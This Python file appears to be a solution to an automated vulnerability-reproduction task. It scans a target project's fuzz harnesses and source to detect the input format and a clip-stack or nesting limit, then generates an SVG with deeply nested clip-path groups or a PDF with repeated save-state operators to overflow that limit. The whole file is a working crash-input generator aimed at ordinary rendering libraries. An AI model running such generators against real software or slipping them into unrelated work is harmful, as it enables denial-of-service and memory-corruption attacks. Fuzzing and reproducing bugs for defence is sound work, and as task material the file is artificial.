import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    _SOURCE_EXTS = (
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".m", ".mm",
        ".rs",
        ".go",
        ".java",
        ".py",
        ".js", ".ts",
        ".cs",
        ".swift",
        ".kt",
        ".cmake",
        "cmakelists.txt",
        "meson.build",
        "configure.ac",
        "configure.in",
        "makefile",
        ".mk",
    )

    def _is_sourceish(self, name_lower: str) -> bool:
        if name_lower.endswith(self._SOURCE_EXTS):
            return True
        base = os.path.basename(name_lower)
        if base in ("cmakelists.txt", "meson.build", "configure.ac", "configure.in", "makefile"):
            return True
        if "/fuzz" in name_lower or "fuzz" in base:
            if any(base.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".go", ".java")):
                return True
        return False

    def _iter_texts_from_tar(self, tar_path: str,
                             max_files: int = 4000,
                             max_total_read: int = 60_000_000,
                             max_per_file: int = 1_200_000) -> Iterable[Tuple[str, str]]:
        total = 0
        count = 0
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if count >= max_files or total >= max_total_read:
                    break
                if not m.isfile():
                    continue
                name = m.name
                name_lower = name.lower()
                if not self._is_sourceish(name_lower):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read(min(m.size, max_per_file))
                except Exception:
                    continue
                total += len(b)
                count += 1
                try:
                    t = b.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if t:
                    yield name, t

    def _iter_texts_from_dir(self, root: str,
                             max_files: int = 4000,
                             max_total_read: int = 60_000_000,
                             max_per_file: int = 1_200_000) -> Iterable[Tuple[str, str]]:
        total = 0
        count = 0
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if count >= max_files or total >= max_total_read:
                    return
                path = os.path.join(dirpath, fn)
                rel = os.path.relpath(path, root).replace("\\", "/")
                name_lower = rel.lower()
                if not self._is_sourceish(name_lower):
                    continue
                try:
                    sz = os.path.getsize(path)
                    with open(path, "rb") as f:
                        b = f.read(min(sz, max_per_file))
                except Exception:
                    continue
                total += len(b)
                count += 1
                try:
                    t = b.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if t:
                    yield rel, t

    def _collect_texts(self, src_path: str) -> List[Tuple[str, str]]:
        if os.path.isdir(src_path):
            return list(self._iter_texts_from_dir(src_path))
        return list(self._iter_texts_from_tar(src_path))

    def _detect_format(self, texts: List[Tuple[str, str]]) -> str:
        harness_texts: List[str] = []
        all_texts: List[str] = []
        for name, t in texts:
            all_texts.append(t)
            nl = name.lower()
            if "fuzz" in nl or "fuzzer" in nl:
                if ("llvmfuzzertestoneinput" in t.lower()) or ("fuzz_target!" in t) or ("honggfuzz" in t.lower()):
                    harness_texts.append(t)

        hay = "\n".join(harness_texts) if harness_texts else "\n".join(all_texts[:200])

        m = re.search(r'load\s*\([^;]*,\s*[^;]*,\s*"(svg|tvg|json|lottie|pdf)"', hay, flags=re.IGNORECASE)
        if m:
            fmt = m.group(1).lower()
            if fmt == "lottie":
                return "json"
            return fmt

        scores: Dict[str, int] = {"svg": 0, "tvg": 0, "pdf": 0, "json": 0}
        lhay = hay.lower()

        def bump(fmt: str, pat: str, w: int = 1) -> None:
            scores[fmt] += w * lhay.count(pat)

        bump("svg", "sksvg", 10)
        bump("svg", "svgdom", 10)
        bump("svg", "<svg", 12)
        bump("svg", "clip-path", 6)
        bump("svg", "\"svg\"", 8)
        bump("svg", ".svg", 4)
        bump("svg", "nsvg", 5)
        bump("svg", "resvg", 8)
        bump("svg", "usvg", 8)

        bump("tvg", "\"tvg\"", 10)
        bump("tvg", ".tvg", 8)
        bump("tvg", "thorvg", 6)
        bump("tvg", "tvg::", 6)

        bump("pdf", "%pdf", 15)
        bump("pdf", "\"pdf\"", 10)
        bump("pdf", ".pdf", 6)
        bump("pdf", "mupdf", 8)
        bump("pdf", "pdfium", 8)

        bump("json", "lottie", 12)
        bump("json", "\"json\"", 8)
        bump("json", ".json", 4)
        bump("json", "serde_json", 6)
        bump("json", "rapidjson", 6)
        bump("json", "cjson", 4)

        best = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores[best] == 0:
            return "svg"
        return best

    def _extract_depth_candidate(self, texts: List[Tuple[str, str]]) -> Optional[int]:
        candidates: List[Tuple[int, int]] = []
        digit_re = re.compile(r"(?<![A-Za-z0-9_])(\d{2,7})(?![A-Za-z0-9_])")

        def add_from_line(line: str, base_w: int) -> None:
            for m in digit_re.finditer(line):
                try:
                    v = int(m.group(1))
                except Exception:
                    continue
                if v < 16 or v > 2_000_000:
                    continue
                candidates.append((base_w, v))

        for _, t in texts:
            lt = t.lower()

            idx = 0
            while True:
                p = lt.find("clip mark", idx)
                if p < 0:
                    break
                w = 8
                start = max(0, p - 200)
                end = min(len(t), p + 200)
                add_from_line(t[start:end], w)
                idx = p + 1

            idx = 0
            while True:
                p = lt.find("clip_mark", idx)
                if p < 0:
                    break
                w = 8
                start = max(0, p - 200)
                end = min(len(t), p + 200)
                add_from_line(t[start:end], w)
                idx = p + 1

            for line in t.splitlines():
                l = line.lower()
                if "clip" not in l:
                    continue
                w = 1
                if "stack" in l:
                    w += 2
                if "layer" in l:
                    w += 1
                if "nest" in l or "depth" in l:
                    w += 3
                if "max" in l or "limit" in l or "capacity" in l or "size" in l:
                    w += 2
                if "mark" in l:
                    w += 2
                if w >= 3:
                    add_from_line(line, w)

            for m in re.finditer(r"(?:kMax|MAX)[A-Za-z0-9_]*(?:Clip|Layer)[A-Za-z0-9_]*(?:Stack|Depth|Nesting)[A-Za-z0-9_]*\s*(?:=|:)\s*(\d{2,7})", t):
                try:
                    v = int(m.group(1))
                    if 16 <= v <= 2_000_000:
                        candidates.append((9, v))
                except Exception:
                    pass

            for m in re.finditer(r"std::array\s*<[^>]+,\s*(\d{2,7})\s*>", t):
                try:
                    v = int(m.group(1))
                    if 16 <= v <= 2_000_000:
                        candidates.append((4, v))
                except Exception:
                    pass

        if not candidates:
            return None

        best_w = max(w for w, _ in candidates)
        top = [v for w, v in candidates if w == best_w]
        v = max(top)

        if v > 400_000:
            near = [x for x in top if x <= 400_000]
            if near:
                v = max(near)
            else:
                v = 400_000
        return v

    def _gen_svg(self, depth: int) -> bytes:
        open_tag = b'<g clip-path="url(#c)">'
        close_tag = b"</g>"
        header = (
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b"<defs><clipPath id=\"c\"><rect width=\"1\" height=\"1\"/></clipPath></defs>"
        )
        inner = b'<rect width="1" height="1"/>'
        footer = b"</svg>"

        per_level = len(open_tag) + len(close_tag)
        base_len = len(header) + len(inner) + len(footer)

        max_output = 8_000_000
        if base_len + depth * per_level > max_output:
            depth = max(1, (max_output - base_len) // per_level)

        return header + (open_tag * depth) + inner + (close_tag * depth) + footer

    def _gen_pdf(self, depth: int) -> bytes:
        depth = max(1, min(depth, 500_000))
        ops = (b"q\n" * depth) + (b"Q\n" * depth)
        content_stream = ops

        parts: List[bytes] = []
        parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
        offsets: List[int] = [0]

        def add_obj(obj_num: int, data: bytes) -> None:
            offsets.append(sum(len(p) for p in parts))
            parts.append(f"{obj_num} 0 obj\n".encode("ascii") + data + b"\nendobj\n")

        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>")
        add_obj(4, b"<< /Length " + str(len(content_stream)).encode("ascii") + b" >>\nstream\n" + content_stream + b"\nendstream")

        xref_start = sum(len(p) for p in parts)
        xref_entries = [b"0000000000 65535 f \n"]
        for off in offsets[1:]:
            xref_entries.append(f"{off:010d} 00000 n \n".encode("ascii"))
        xref = b"xref\n0 " + str(len(xref_entries)).encode("ascii") + b"\n" + b"".join(xref_entries)
        trailer = b"trailer\n<< /Size " + str(len(xref_entries)).encode("ascii") + b" /Root 1 0 R >>\nstartxref\n" + str(xref_start).encode("ascii") + b"\n%%EOF\n"

        return b"".join(parts) + xref + trailer

    def solve(self, src_path: str) -> bytes:
        try:
            texts = self._collect_texts(src_path)
        except Exception:
            texts = []

        fmt = self._detect_format(texts) if texts else "svg"
        cap = self._extract_depth_candidate(texts) if texts else None

        if cap is None:
            depth = 40000
        else:
            depth = cap + 64

        if fmt == "pdf":
            return self._gen_pdf(depth)
        return self._gen_svg(depth)